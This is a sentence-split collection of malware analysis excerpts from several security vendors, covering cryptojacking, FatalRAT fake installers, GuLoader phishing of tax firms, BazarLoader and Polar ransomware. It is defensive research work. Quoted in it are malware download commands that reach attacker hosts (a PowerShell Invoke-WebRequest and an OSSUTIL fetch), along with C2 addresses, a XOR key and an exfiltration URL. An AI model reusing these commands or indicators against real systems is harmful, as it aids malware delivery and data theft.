sentence.11870: Finally, another TeamTNT malware repository was identified by Unit 42 researchers, as shown in Figure 14.
sentence.11871: The larger Chimaera repository contains known TeamTNT cryptojacking scripts and binary files.
sentence.11872: Within the spread/redis directory, the file b.sh, 3b14c84525f2e56fe3ae7dec09163a4a9c03f11e6a8d65b021c792ad13ed2701, was found, which directly links TeamTNT to the cryptojacking operations expressed in this report.
sentence.11874: TeamTnT repository containing the b.sh script.
sentence.11875: The b.sh script contains the 43xb TeamTNT and WatchDog Monero wallet address and points to the 199.19.226[.]117 TeamTNT and WatchDog IP addresses (Figure 15).
sentence.11876: It also contains a hardcoded link to a known TeamTNT cloud enumeration script hosted on the known TeamTNT domain borg[.]wtf, see Figure 16. Figure 15.
sentence.11877: TeamTNT and WatchDog XMR wallet and IP address.
sentence.11880: The borg[.]wtf domain was linked to TeamTNT via a previous Unit 42 report.
sentence.11881: The correlations between TeamTNT and WatchDog are intrinsically connected with this b.sh script.
sentence.11882: Conclusion Considering the above evidence, it appears that WatchDog operations have incorporated the TTPs of the TeamTNT cryptojacking group and have significantly increased their own cryptojacking operations.
sentence.11883: The new WatchDog operation does not appear to use the advanced functionalities TeamTNT has used recently, namely cloud credential scraping as well as targeted Kubernetes- and Docker-focused lateral movement and exploit scripts.
sentence.11884: It’s also noteworthy that the new operation does not incorporate the more advanced GoLang binaries traditionally associated with WatchDog, which are capable of exploiting Windows- or NIX-based operating systems.
sentence.11885: It appears that WatchDog actors are attempting to expand their cryptojacking operations, while simultaneously masking their operations with those of the known cryptojacking operations performed by TeamTNT.
sentence.11886: Unit 42 researchers will continue to monitor this cryptojacking event and provide updates as needed.
sentence.11887: The following tips are highly recommended by Unit 42 researchers to assist in the protection of cloud infrastructure.
sentence.11888: Monitor and block network traffic to known malicious endpoints.
sentence.11889: Only deploy vetted container images within production environments.
sentence.11890: Implement and use Infrastructure as Code (IaC) scanning platforms to prevent insecure cloud instances from being deployed into production environments.
sentence.11891: Use cloud infrastructure configuration scanning tools that enable governance, risk management and compliance (GRC) to identify potentially threatening misconfigurations.
sentence.11892: Use cloud endpoint agents to monitor and prevent the running of known malicious applications within cloud infrastructure.

sentence.11897: title: These aren’t the apps you’re looking for: fake installers targeting Southeast and East Asia url: https://www.welivesecurity.com/2023/02/16/these-arent-apps-youre-looking-for-fake-installers/ ESET researchers have identified a campaign using trojanized installers to deliver the FatalRAT malware, distributed via malicious websites linked in ads that appear in Google search results ESET researchers identified a malware campaign that targets Chinese-speaking people in Southeast and East Asia by buying misleading advertisements to appear in Google search results that lead to downloading trojanized installers.
sentence.11898: The unknown attackers created fake websites that look identical to those of popular applications such as Firefox, WhatsApp, or Telegram, but in addition to providing the legitimate software, also deliver FatalRAT, a remote access trojan that grants the attacker control of the victimized computer.
sentence.11899: Key points of the blogpost: The attackers purchased advertisements to position their malicious websites in the “sponsored” section of Google search results.
sentence.11900: We reported these ads to Google and they were promptly removed.
sentence.11901: The websites and installers downloaded from them are mostly in Chinese and in some cases falsely offer Chinese language versions of software that is not available in China.
sentence.11902: We observed victims mostly in Southeast and East Asia, suggesting that the advertisements were targeting that region.
sentence.11903: We observed these attacks between August 2022 and January 2023, but according to our telemetry previous versions of the installers have been used since at least May 2022.
sentence.11904: None of the malware or network infrastructure used in this campaign has been matched to known activities of any named groups, so for now we have not attributed this activity to any known group.
sentence.11905: Victimology Figure 1 shows a heatmap with the countries where we detected the attacks between August 2022 and January 2023.
sentence.11906: Most of the attacks affected users in Taiwan, China and Hong Kong.
sentence.11908: Countries where we detected the attacks between August 2022 and January 2023 We also observed a small number of cases in: Malaysia Japan The Philippines Thailand Singapore Indonesia Myanmar Attack overview A simplified overview of the attack is shown in Figure 2.
sentence.11909: A chain of multiple components ultimately installs the FatalRAT malware that was described by AT&T researchers (@attcyber) in August 2021.
sentence.11911: Simplified overview of the attack Fake websites
sentence.11912: The attackers registered various domain names that all pointed to the same IP address: a server hosting multiple websites that download trojanized software.
sentence.11913: Some of these websites look identical to their legitimate counterparts but deliver malicious installers instead.
sentence.11914: The other websites, possibly translated by the attackers, offer Chinese language versions of software that is not available in China, such as Telegram, as shown in Figure 3. Figure 3.
sentence.11915: Fake Telegram website that delivers the FatalRAT malware We observed malicious websites and installers for these applications, roughly in order of popularity: Chrome Firefox Telegram WhatsApp Line Signal Skype Electrum Bitcoin wallet Sogou Pinyin Method, a Chinese Pinyin input method editor Youdao, a dictionary and translation application WPS Office, a free office suite You can see other fake websites in the gallery shown in Figure 4 (click on an image to enlarge it).
sentence.11916: Apart from electrumx[.]org, a fake website in English for the Electrum Bitcoin wallet, all the other websites are in Chinese, suggesting that the attackers are mostly targeting Chinese speakers.
sentence.11918: Fake websites created by the attackers to deliver malicious installers (click to enlarge)
sentence.11919: While in theory there are many possible ways that potential victims can be directed to these fake websites, a news site reported (English version here) that they were being shown an advertisement that led to one of these malicious websites when searching for the Firefox browser in Google.
sentence.11920: We couldn’t reproduce such search results, but believe that the ads were only served to users in the targeted region.
sentence.11921: An example is shown in Figure 5 (image from the original post above).
sentence.11922: We reported the websites to Google and the ads were taken down.
sentence.11924: Search results for Firefox, with a fake website advertised (image credit: landiannews.com)
sentence.11925: Given the fact that many of the domain names that the attackers registered for their websites are very similar to the legitimate domains, it is also possible that the attackers rely on typosquatting as well to attract potential victims to their websites.
sentence.11926: Some examples are: You’ll find the rest of the domain names that we observed in the IoCs section.
sentence.11927: Installers The installers downloaded from the fake websites are not hosted on the same server as the websites, but in the Alibaba Cloud Object Storage Service.
sentence.11928: They are digitally signed MSI files (see the Certificates section) created with Advanced Installer.
sentence.11929: Figure 6 shows the malicious installers that the attackers uploaded to the cloud storage on January 6th, 2023.
sentence.11931: Malicious installers uploaded by the attackers to their cloud storage on January 6th, 2023 When these installers are executed, they usually: Drop and execute the malicious loader, and files needed to run the FatalRAT malware, in the %PROGRAMDATA%\Progtmy directory.
sentence.11932: Drop the malicious updater and related files in the %PROGRAMDATA%\Progtmy\0 directory.
sentence.11933: Drop a file named ossutilconfig in the %USERPROFILE% directory.
sentence.11934: This file contains credentials used by the updater to connect to a remote bucket in the Alibaba Cloud.
sentence.11936: PROGRAMDATA%\Progptp (although we observed some cases where the FatalRAT malware was installed in this directory instead).
sentence.11937: Drop and execute the legitimate installer in C:\Program Files\Common Files (see CommonFiles64Folder).
sentence.11938: Create scheduled tasks to execute the loader and updater components.
sentence.11939: The malware is run by side-loading a malicious DLL, libpng13.dll, which is used by sccs.exe (Browser Support Module), a legitimate executable developed by Xunlei.
sentence.11940: The original libpng13.dll is also included in the installer package (renamed to what appears to be a random name) because the malicious DLL forwards its exported functions to the original DLL.
sentence.11941: Some of the forwarded exports in the malicious DLL are shown in Figure 7.
sentence.11942: The image shows that the original DLL was renamed to BHuedjhd.dll in this example and that the malicious DLL was compiled as Dll22.dll.
sentence.11944: Part of the exported functions in the malicious DLL that are forwarded to the original The malware updater is executed in a similar manner, by side-loading dr.dll, used by a legitimate, signed binary developed by Tencent.
sentence.11945: The malicious DLL is very simple and executes OSSUTIL (included in the installer package as ssu.exe) to download files from an attacker-controlled bucket in Alibaba Cloud.
sentence.11946: The command executed by the DLL is: cmd /C
sentence.11947: “C:\ProgramData\Progtmy\2\ssu.exe cp -r oss://occ-a1/dll/3/ C:\ProgramData\Progtmy\ –update” This should update files in the %PROGRAMDATA%\Progtmy local directory from the remote bucket occ-a1 (a different bucket than the ones used to store the installers, but in the same account), but it doesn’t work in any of the installers that we analyzed because the %PROGRAMDATA%\Progtmy\2 subdirectory doesn’t exist (it should be subdirectory 0, created by the installer).
sentence.11948: The attackers made the same mistake with the scheduled tasks created for the updater, as the execution path also refers to a subdirectory 2 that doesn’t exist.
sentence.11949: In most cases, four scheduled tasks are created: two for the RAT (one set to execute periodically and the other whenever any user logs into the PC) and two for the updater.
sentence.11950: The names of the tasks are based in the Windows build number and the name of the computer, as shown in Figure 8. Figure 8.
sentence.11951: Scheduled tasks created by the malicious installers Loaders The loader – libpng13.dll – is a very simple component that opens and executes in memory a file named Micr.jpg, located in the same directory as the DLL.
sentence.11952: The attackers have obfuscated the loader with many calls to a function that just prints some hardcoded values.
sentence.11953: It’s possible that this behavior was used to avoid being detected by security solutions or to complicate the analysis of the DLL.
sentence.11954: Figure 9 shows an example of the obfuscated code on the left and the deobfuscated code on the right.
sentence.11956: Part of the decompiled code for libpng13.dll on the left and on the right the same code deobfuscated Micr.jpg is actually shellcode that also contains an embedded DLL.
sentence.11957: The purpose of this shellcode is to load and execute in memory the embedded DLL by calling an export function of the DLL named SignalChromeElf.
sentence.11958: Before the execution of this export function, the shellcode reconstructs the imports table of the DLL and calls the DllEntryPoint, which simply invokes the Windows API function DisableThreadLibraryCalls as a way to increase the stealthiness of the DLL. SignalChromeElf essentially will decrypt, load, and execute an encrypted payload located in the embedded DLL.
sentence.11959: This encrypted payload is the FatalRAT malware, and after its decryption the DLL will find the address of an export function called SVP7, which contains the entry point of the malware, and call it, passing the encrypted configuration of FatalRAT as an argument.
sentence.11960: The function in the embedded DLL that decrypts the payload is the same as the function used in FatalRAT to decrypt its configuration.
sentence.11961: An example of this function is shown in Figure 10.
sentence.11962: FatalRAT FatalRAT is a remote access trojan documented in August 2021, by AT&T Alien Labs.
sentence.11963: This malware provides a set of functionalities to perform various malicious activities on a victim’s computer.
sentence.11964: As an example, the malware can: Capture keystrokes Change the victim’s screen resolution Terminate browser processes and steal or delete their stored data.
sentence.11965: The targeted browsers are: Chrome Firefox QQBrowser Sogou Explorer Download and execute a file Execute shell commands This malware contains various checks to determine whether it’s running in a virtualized environment.
sentence.11966: Depending on its configuration, these checks may be executed or not.
sentence.11967: From our own analysis we were able to determine that the FatalRAT version used in this campaign is very similar to the one documented by AT&T in their blogpost, so we won’t go into more details.
sentence.11968: A comparison of them is shown in Figure 11, and Figure 10 shows the decompiled code used to decrypt strings in the FatalRAT samples from this campaign, which is the same as the one described by AT&T. Figure 10.
sentence.11969: Decompiled code of a function used by a FatalRAT sample to decrypt its configuration strings Figure 11.
sentence.11970: BinDiff comparison between a FatalRAT sample analyzed by AT&T and the FatalRAT sample found in this campaign Previous version We found a previous version of the malicious installer that the attackers have used since at least May 2022.
sentence.11971: Unlike the installers that we described previously, this version contains an XOR-encrypted payload, divided into three files: Micr.flv, Micr2.flv, and Micr3.flv, each file encrypted with a different, single byte XOR key.
sentence.11972: Once decrypted, the content of the three files is concatenated, forming shellcode that contacts a C&C server to download and execute further shellcode.
sentence.11973: The loader DLL in this case is named dr.dll – the same name that is used for the update mechanism in later versions of the installer, side-loaded by the same legitimate executable.
sentence.11974: Given that this older version doesn’t seem to have an updater, we believe that the attackers have replaced it with the new version of the installer since August 2022.
sentence.11975: Twitter user Jirehlov Solace reported other versions of the installers starting in May 2022, as can be seen in this thread.
sentence.11976: Although some of those installers are the same as ones in this report, it seems that most of them are different, compiled as EXE files (not MSI installers) and using a variety of software packers.
sentence.11977: Those samples are probably connected with Operation Dragon Breath as described by Qi An Xin in May 2022.
sentence.11978: Conclusion The attackers have expended some effort regarding the domain names used for their websites, trying to be as similar to the official names as possible.
sentence.11979: The fake websites are, in most cases, identical copies of the legitimate sites.
sentence.11980: As for the trojanized installers, they install the actual application that the user was interested in, avoiding suspicion of a possible compromise on the victim’s machine.
sentence.11981: For all of these reasons, we see how important it is to diligently check the URL that we are visiting before we download software.
sentence.11982: Even better, type it into your browser’s address bar after checking that it is the actual vendor site.
sentence.11983: Since the malware used is this campaign, FatalRAT, contains various commands used to manipulate data from different browsers, and the victimology is not focused on a particular type of user, anyone can be affected.
sentence.11984: It is possible that the attackers are solely interested in the theft of information like web credentials to sell them on underground forums or to use them for another type of crimeware campaign, but for now specific attribution of this campaign to a known or new threat actor is not possible.

sentence.12046: title: Tax firms targeted by precision malware attacks url: https://news.sophos.com/en-us/2023/04/13/tax-firms-targeted-by-precision-malware-attacks/ Financial accountant firms and CPAs are in the crosshairs this tax season, as a threat actor is targeting that industry with an attack that combines social engineering with a novel exploit against Windows computers to deliver malware called GuLoader.
sentence.12047: At least two organizations in that industry, both Sophos customers, reported the unusual attack to us in late February and early March, as tax preparers are entering the busiest part of the season in the United States.
sentence.12048: (The tax filing deadline this year is April 17, 2023.)
sentence.12049: The attack begins with an email that purports to solicit business from the tax preparation firm.
sentence.12050: The initial message to the target is benign, with a subject line of Prospective Client Enquiries containing nothing more than an introduction and a request for information about “onboarding new clients.”
sentence.12051: The email sender goes on to claim that “The CPA I used last year is retired, so here I am on the lookout for a new firm to work with.”
sentence.12052: Responding to the hook with a bigger hook If the target responds to this initial solicitation, the sender then sends a follow-up email with a link to a password-protected Zip file hosted on a cloud storage service.
sentence.12053: The Zip archive has a filename that includes the last name of the fictitious person whose purportedly sent the initial email message.
sentence.12054: In each of the messages we saw targeting different accounting firms, the attacker used different names, such as Rodney Williamson or Sarah Knapp.
sentence.12055: The fake sender used the same password of Fresh@123 for the Zip archive in the samples we obtained.
sentence.12056: Because the attacker only sends the link to a CPA who responds to the initial email message, very few of them were caught in spam traps.
sentence.12057: The samples we obtained had been submitted to us only after the targets realized they were being attacked.
sentence.12058: The sender was very conversational and personable in the messages, helpfully offering that the Zip archive contains “in addition to my tax transcripts for the past two years…a copy of my driver’s license.”
sentence.12059: The attacker also asks the target “Would you be available for a quick telephone call on Friday?”
sentence.12060: Whoever crafted the messages has a good grasp of English-language euphemisms and tax-filing vernacular.
sentence.12061: These messages, with a few very minor spelling or grammar errors, were very hard to discern from ones that might be sent by a legitimate, prospective client of a tax firm.
sentence.12063: If the first stage of the process involves convincing the accounting professional to download and open the linked Zip archive, the next phase is completely out of the tax preparer’s control.
sentence.12064: The Zip archive contains two files: A Windows Shortcut (a .LNK file), and a benign decoy attachment.
sentence.12065: In the examples we received, one Zip contained a benign file named screenshot1242.jpeg and another contained a file named privatecopy.pdf.
sentence.12066: Both of these files were the same three minute long MP3 audio recording – a file that sounds like someone playing an Oud, the stringed instrument similar to a lute used widely in the middle east.
sentence.12067: When someone tries to double-click these decoy files, Windows (or the application mapped to the relevant filetype) throws an error because the file isn’t the type of file it appears to be.
sentence.12068: Adobe Reader or a photo viewing program can’t open the file.
sentence.12069: The target would then, naturally, double click the other file in the Zip archive — a Windows Shortcut (.LNK file) labeled with a PDF file suffix and with an icon that makes it appear to be a PDF document.
sentence.12070: Unusually, the Windows shortcut has been manipulated in such a way that Windows seems to think that it is a VBScript Script File in the shortcut’s properties sheet.
sentence.12071: The action taken by the shortcut is rendered not visible in the Properties sheet, either, in what appears to be a novel, malicious use of an exploit first publicly disclosed a year ago in a blog post by researcher @x86matthew, who works for the UK-based offensive security research company MDSec.
sentence.12072: The attackers have crafted the shortcut, by prepending a large number of space characters to the Target field in the properties, so that the Target field appears blank.
sentence.12073: However, when viewed using a hex editor, the text content of the shortcut is rendered visible.
sentence.12074: It contains a PowerShell command that looks like the following: Invoke-WebRequest http://0x[two hex bytes].[eight digits]/fresh/fordl.vbs -OutFile
sentence.12075: C:\Windows\Tasks\[eight letters].vbs The shortcut command pulls down a Visual Basic script, drops it into the C:\Windows\Tasks folder, and executes it.
sentence.12076: A second command appended to the first drops an actual PDF document (of someone’s IRS form W-2, 1099, or 1040) into the same location and opens it as well, as a decoy.
sentence.12077: The crafting of the URL was somewhat unique.
sentence.12078: The attacker seems to have made a mashup of two different formats of so-called “dotless” IP address (an unusual combo of the hex and “dword” types of dotless IPs) into a combination that isn’t human-readable, but that networked applications like PowerShell can understand and interpret as valid IPv4 addresses.
sentence.12079: The script shown above uses the address 0xC2.11808979 in the URL, which translates to the IPv4 address 194.180.48.211.
sentence.12080: We also discovered scripts that pointed to malicious files hosted on the addresses 0x6D.13561923 (109.206.240.67) and 0x05.526436 (5.8.8.100).
sentence.12081: All of the servers hosting the malware hosted them inside of open directories.
sentence.12082: We found 29 different varieties of the VBS and 90 other encrypted and unencrypted payloads hosted in these locations.
sentence.12085: The initial infector is a Visual Basic script, heavily obfuscated, and very large at more than 200KB in size.
sentence.12086: A block of base64-encoded, encrypted data comprises almost 150KB of that script, along with code that decodes and decrypts the block of base64.
sentence.12087: The VBS contains two large variables.
sentence.12088: In the script we analyzed, these were named Ir8 and O7, respectively, but although the variable names were slightly modified in each variant of the script we examined, the overall flow was the same.
sentence.12089: These work in tandem to insert data into the Windows Registry and execute PowerShell commands.
sentence.12090: When decoded, the content of the Ir8 variable (a segment of which is shown below) turns out to be just another encoded PowerShell script, which the VBS decodes and then executes.
sentence.12091: The PowerShell script decoded from the Ir8 variable uses Reflection.
sentence.12092: Assembly to load the final payload into memory from a Registry value without writing it to disk.
sentence.12093: The script (shown in part, below) converts several small strings to bytes, concatenates the output, performs a BXOR to decode the bytes, and then converts those bytes to ASCII text, before executing them.
sentence.12094: And the content loaded out of the Registry?
sentence.12095: That’s what comes from the O7 variable (shown in part, below, because it is too large to fit on one screenshot).
sentence.12096: The concatenated segments of base64 data from O7 get inserted into the Registry, for the Ir8 script to decode.
sentence.12097: Post-infection, the machine will have an instance of an otherwise benign Windows binary running.
sentence.12098: On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe, used by the now defunct Internet Explorer browser for tuning the microphone settings in the browser.
sentence.12099: But the malware doesn’t exclusively inject its code into this exe; Other now-defunct Internet Explorer components were also observed being abused by the malware, including ieinstal.exe (the tool that installs Add-Ons into Internet Explorer).
sentence.12100: The malware makes several other changes to Windows settings during the infection process.
sentence.12101: It creates a User-level Environment Variable (in our test case, this was called SaltoQ), which points at the full path to the PowerShell executable on the system.
sentence.12102: It created a Run key in the Registry named Overproduce that invokes the SaltoQ variable to run a PowerShell command at every reboot.
sentence.12103: And that Run key references a different Registry key, in HKEY_CURRENT_USER\Cloglike that contains a portion of the same Visual Basic Script code that was in the original .vbs payload the malware downloads during the infection process.
sentence.12104: Once infected, the ielowutil.exe binary constantly attempts to contact its command–and-control server, on 64.44.101.171:9191.
sentence.12105: During our attempts to infect machines with the malware, that C2 server failed to respond.
sentence.12106: However, we did infect a test machine with other samples from this attack, and some of those were successful at connecting to C2 servers at 84.21.172.49:1040 (ironic port number!)
sentence.12108: Both of those C2s were live as of publication of this blog.
sentence.12109: We also detected the infected computer repeatedly attempting to resolve the address of the domain newmansubzero.com, which is the 64.44.
sentence.12111: Guidance and detection Tax preparers and accountants are extremely busy at the best of times, but during US tax season, which culminates in mid-April, they are the busiest they will be all year.
sentence.12112: Harried CPAs from firms of all sizes must be wary that they are targets for criminals who would love nothing more than the sensitive financial data they receive in abundance at this time of year.
sentence.12113: The attack method in this case takes advantage of the frenetic pace of tax season and uses a social engineering tactic to smooth the way for the malware to be delivered via email.
sentence.12114: As such, it’s very prudent to be cautious when you’re approached by potential new clients.
sentence.12115: Ask them if they will speak to you on the phone directly, who referred them to you, and if they’d be willing to come in for an in-person evaluation.
sentence.12116: Most of all, be very wary of people who send you a Dropbox link to a password-protected Zip file at any time of year.
sentence.12117: When the Zip file is password protected, it can make the contents un-scannable by endpoint security tools.
sentence.12118: If they provide a password, unzip the file and then scan the contents with an endpoint security tool before opening them.
sentence.12119: The PDF icon used for the Shortcut in the attack is also distinctive and unique.
sentence.12120: The icon, which doesn’t resemble the icon used by any known PDF reader application, looks like an icon for a plain text document wrapped in a red bar with the white letters PDF inside.
sentence.12121: It’s also notable that the icon does have the little arrow in the bottom left corner that indicates it is a Shortcut, and not a document.
sentence.12122: It’s possible a busy accountant may not notice that detail.
sentence.12123: When in doubt, you can also right-click (not left-click) the icon, one click only, and choose Properties.
sentence.12124: Even though the Properties sheet won’t display the Powershell command, if the file is a Shortcut it will have a Shortcut tab (normal document files won’t have those) and it accurately shows that the “Target type” is a Visual Basic Script (VBScript Script File).
sentence.12125: Hovering the mouse pointer over the Shortcut icon causes the malicious shortcut to display the information pushed into the Comment field, which makes it appear that the document is in fact a PDF when it is not.
sentence.12126: If you still suspect things are not as they should be, ask the potential customer to call you on the phone before you open the files.
sentence.12127: The attackers, in this case, seemed to limit their communication to email.
sentence.12128: Sophos products detect various aspects of the attack quite comprehensively: Endpoint will detect the shortcut file as Troj/LnkObf-T or Mal/DownLnk-D and the VBS payload of the shortcut as VBS/Inject-IPG.
sentence.12129: Some payload samples may be detected as Behaviorally, it detects the injection techniques used by the attackers as Evade_34a or Evade_34b.
sentence.12130: GuLoader code in memory also will be detected as Mem/Guload-A. Our network security products will block communication to the IP addresses used to host the payloads and the C2 addresses.
sentence.12131: Indicators of compromise relating to this attacker and their tooling are hosted on the Sophos X-Ops Github.
sentence.12132: Acknowledgments Sophos X-Ops wishes to acknowledge the contributions of Colin Cowie and Benjamin Sollman of the MDR intelligence team, Sivagnanam Gn, Anand Ajjan, and Anisha Kumar of SophosLabs, and Sales Engineer Matthew Haltom to our understanding of this threat and its impacts.
sentence.12133: title: BazarLoader Mocks Researchers in December 2020 Malspam Campaign url: https://www.gosecure.net/blog/2021/02/01/bazarloader-mocks-researchers-in-december-2020-malspam-campaign/ BazarLoader Mocks Researchers in December 2020 Malspam Campaign by Lilly Chalupowski | Feb 1, 2021 Our Inbox Detection and Response (IDR) team has observed a new BazarLoader campaign targeting the information technology, aeronautic and financial industries.
sentence.12134: The IDR team has successfully blocked over 550 thousand BazarLoader malspam emails throughout this campaign alone.
sentence.12135: GoSecure researchers received a sample from the IDR team which was suspected of being BazarLoader, named Report Preview15-10.exe, on 2020-10-06.
sentence.12136: Shortly after, GoSecure researchers received yet another BazarLoader sample on 2020-10-08 named Document2-85.exe, which exhibited similar behavior.
sentence.12137: The initial infection vector, which has been observed by our Inbox Detection and Response Team (IDR), is via malspam containing fake employment termination notices and anonymous surveys.
sentence.12138: The threat actor(s) primarily use Google Drive and Google Docs to distribute their malicious payloads.
sentence.12139: The employment termination malspam was observed on October 6, 2020 and the anonymous survey malspam was observed on October 8, 2020.
sentence.12140: This can be seen in Figure 1 and Figure 2. Figure 1: BazarLoader Employment Termination Malspam Figure 2: BazarLoader Fake Anonymous Survey We will firstly analyze the employment termination malspam.
sentence.12141: Once the user clicks the link, they will be redirected tohxxps://docs[.]google[.]com/document/d/e/2PACX-1vR_9tGGWDcS1ZyIuiGpMQg2Sv9nRWempyUKuQ1iyJp_HHt1C87OPirnO7EImnOW6ILbrmHXUpl_OIxQ/pub to download an executable.
sentence.12142: The executable Review_Report15-10.exe (3c27fca6d9cf1379eee93e6fea339e61) will appear as a PDF document to users who do not have extensions enabled in Windows, as seen in Figure 3. Figure 3: Stage 1 PDF Icon Lure To help obfuscate its purpose, BazarLoader appears to be bound or obfuscated with legitimate resources from YUVPlayer (A Lightweight YUV player which supports various YUV formats).
sentence.12143: An example of this can be seen in Figure 4. Figure 4: YUVPlayer Dialog Embedded Resource Once executed, the legitimate application or dialogs will not be shown to the user.
sentence.12144: Instead, it will call advapi32.CryptHashData using the string s_)q03vcOm95^+Rj3dG_Jx@k0GGwYOIddH_14025b520 as the data to create a hash using the PROV_RSA_FULL Windows cryptographic provider.
sentence.12145: Once the hash is created, it will create a key using advapi32.CryptDeriveKey.
sentence.12146: It will then obtain a handle to the current process for the purpose of allocating memory with PAGE_EXECUTE_READWRITE permissions.
sentence.12147: The next function is responsible for copying the shellcode from the .data section to the newly allocated memory location.
sentence.12148: Once the encrypted shellcode has been copied to executable memory, it will then use advapi32.CryptEncrypt to decrypt the shellcode.

sentence.12194: title: Investigation with a twist: an accidental APT attack and averted data destruction url: https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ In late April 2020, a client invited the CSIRT incident response team at the Positive Technologies Expert Security Center (PT ESC) to investigate a network compromise that resulted in encryption of files on servers and employee workstations.
sentence.12195: We initially assumed that this was yet another attack on corporate networks with a common variety of ransomware.
sentence.12196: However, what we found was different: this intrusion was the work of a well-known Asian APT group implicated in cyberespionage against government targets.
sentence.12197: The initial successful compromise had taken place two years prior.
sentence.12198: In this article, we will share the results of our investigation of this targeted attack, which started with the compromise of a foreign office.
sentence.12199: Ultimately, we succeeded in bringing the infrastructure back to a secure condition and reversing the damage that had been done.
sentence.12200: Sequence of events Mass encryption of files on the client's infrastructure and a ransom demand formed the starting point of the investigation.
sentence.12201: A large number of damaged files is itself a very visible attack indicator that enabled detecting the intrusion.
sentence.12202: Retrospective analysis showed that the client's infrastructure had been compromised not three or four days before (or even a few hours before, as often happens in mass attacks), but in early 2018.
sentence.12203: What's more, the initial infection was of a foreign office of the client.
sentence.12204: Then a subsequent breach of the head office back home.
sentence.12205: We believe that the initial entry point to the foreign office's network was a vulnerable server on the network perimeter.
sentence.12206: Exploitation in February 2018 enabled the attackers to gain initial access and then persistence, with the help of the ChinaChopper and TwoFace web shells.
sentence.12207: The attackers used NBTScan for network reconnaissance and PsExec for lateral movement.
sentence.12208: They obtained credentials for pivoting with Mimikatz.
sentence.12209: In some cases, we were able to detect memory dumps of the lsass process that had been archived and uploaded.
sentence.12210: Because use of Mimikatz was likely blocked by endpoint security software, the attackers were forced to run bruteforcing offline.
sentence.12211: Another method was to scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer.
sentence.12212: On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdoors were installed for reliable persistence and access.
sentence.12213: One unexpected result of the compromise was cryptocurrency mining at both the foreign office and headquarters.
sentence.12214: Such activity remained unnoticed for one and a half years.
sentence.12215: During this time the attackers only maintained their access abilities by periodically obtaining new accounts or building tunnel chains.
sentence.12216: Our belief is that by early 2020, the attackers had lost their access (for reasons unknown to us).
sentence.12217: We can see use of web shells on the foreign office's servers on February 9, 2020.
sentence.12218: Subsequent actions were very similar to what had happened two years earlier.
sentence.12219: By using the tools already described, the attackers obtained the credentials of a domain administration at headquarters.
sentence.12220: This time, they deleted OS logs and stopped Shadow Copy services, complicating subsequent incident analysis.
sentence.12221: For the finale, on April 29, 2020, the account of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.
sentence.12222: While our specialists were assisting the client in May 2020, the attackers made yet another attempt to regain control of infrastructure with the help of web shells that were still in place on the network of the headquarters and office, but this time to no success.
sentence.12223: Here we have provided a timeline to better show the sequence of events.
sentence.12224: CSIRT's objectives included recovering the client's data, which included key information belonging to different departments.
sentence.12225: We performed analysis of the encryption malware and were able to recover the lost files.
sentence.12227: The method used to run the ransomware is classic and, indeed, characteristic of certain Asian groups.
sentence.12228: Three files are sent to the victim's computer:
sentence.12229: GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft.
sentence.12230: GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.
sentence.12231: This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported.
sentence.12232: This frequently used technique of loading malicious code in the context of a legitimate application is known as DLL hijacking.
sentence.12234: Hex is read (after being copied from c:\windows\system32\Sysurl.
sentence.12235: Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.
sentence.12236: The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.
sentence.12237: The payload and intermediate library are deleted before completion.
sentence.12238: Deletion occurs in the standard (insecure) way, which enables recovering the data if disk access is stopped in time and the information has not been overwritten.
sentence.12240: Hex is an encrypted copy of the Polar ransomware.
sentence.12241: This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run the PlugX backdoor, which is widely seen among such Asian APT groups as APT10, APT41, TA459, and Bronze Union.
sentence.12242: Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail.
sentence.12243: Based on how GameuxInstallHelper.dll is launched, we quickly can guess that this file, too, is an executable file compiled with .NET.

sentence.12274: Each approach involves a different encryption key.

sentence.12281: Larger files are encrypted in a different way.
sentence.12282: In this case, the 16-byte encryption key is formed by taking the first 8 bytes from the base encryption key and the remaining 8 bytes from an additional hard-coded array.
sentence.12283: This is followed by a custom implementation of AES-ECB.
sentence.12284: Blocks of 16 bytes are encrypted, with the next 12,800 bytes skipped.
sentence.12285: The result is that only small parts of the file—not the entire file—are encrypted.
sentence.12286: This method was likely to chosen to speed up the encryption process.

sentence.12304: This version is derived by encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.
sentence.12305: After file encryption is completed, the malware writes an image (contained in executable file resources) to disk at the path c:\programdata\Rs.bmp and sets it as the desktop background.
sentence.12306: The malware subsequently repeats the same procedure for deleting system event logs and shadow copies that it performed at the start.
sentence.12307: Then it sends an HTTP POST request with the name of the victim's computer to a server at hxxp://www.therockbrazil.com.br/assinaturas/logs.php.
sentence.12308: How we decrypted the files Readers following the chain of encryption steps have likely noticed that the security of this whole encryption system depends on what we have called the base encryption key.
sentence.12309: Its value is encrypted with RSA-1024 and placed in the ransom demand.
sentence.12310: Currently, there are no methods that are both cheap and fast for factoring a key of such size.
sentence.12312: Remember that the base key is generated by taking eight random characters from the alphabet quoted earlier.
sentence.12313: Here is how the implementation works: The Random function is called once, without any arguments.
sentence.12314: This call returns a random number, the seed for pseudorandom generation of which is taken from the value of the Environment.
sentence.12316: This variable is 4 bytes and stores the number of milliseconds since the operating system started.
sentence.12317: So to decode the files, all we need to know is the uptime (how long the computer has been turned on) as of when the ransomware ran.
sentence.12318: But how simple is it to calculate?
sentence.12319: Most of the affected computers had not only been disconnected from the corporate network, but turned off for analysis of the hard drive contents.
sentence.12320: Due to this, the uptime of the computers could not be known.
sentence.12321: The operating system logs contain timestamps for shutdown and power on.
sentence.12322: But in this case, the ransomware destroys these logs twice.
sentence.12323: So we were unable to find any clues pointing at possible values of uptime on the affected computers themselves.
